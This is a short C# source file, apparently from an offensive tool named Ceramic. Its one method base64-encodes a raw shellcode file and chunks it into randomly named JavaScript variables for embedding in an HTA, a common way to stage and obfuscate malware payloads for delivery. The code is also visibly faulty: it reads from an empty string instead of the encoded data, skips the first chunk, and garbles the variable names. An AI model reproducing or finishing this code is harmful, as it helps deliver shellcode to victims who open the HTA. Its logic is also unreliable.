using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Ceramic
{
    class HTA
    {
        public static string ChunkRAWShellcode_HTA(string FilePath, int ChunkSizes = 100)
        {
            List<string> Chunks = new List<string>();
            String ShellcodeHex = "";
            string VBAArrayName = Utils.RandomString(DateTime.Now.Second);//Utils.RandomString(DateTime.Now.Second);
            string ChunkedString = "";

            string B64Shellcode = Compress.Base64File(FilePath);

            for (int i = 0; i < B64Shellcode.Length; i += ChunkSizes)
            {
                if (i + ChunkSizes > B64Shellcode.Length) ChunkSizes = B64Shellcode.Length - i;
                string item = ShellcodeHex.Substring(i, ChunkSizes);
                Chunks.Add(item);
            }

            for (int x = 1; x < Chunks.Count; ++x)
            {
                ChunkedString += "var " + VBAArrayName + x + " = \"" + Chunks.ElementAt(x) + "\";\r\n";
            }

            for (int x = 1; x < Chunks.Count; ++x)
            {
                VBAArrayName += VBAArrayName + x + "+";
            }

            ChunkedString += "\r\n" + VBAArrayName;

            return ChunkedString;
        }
    }
}
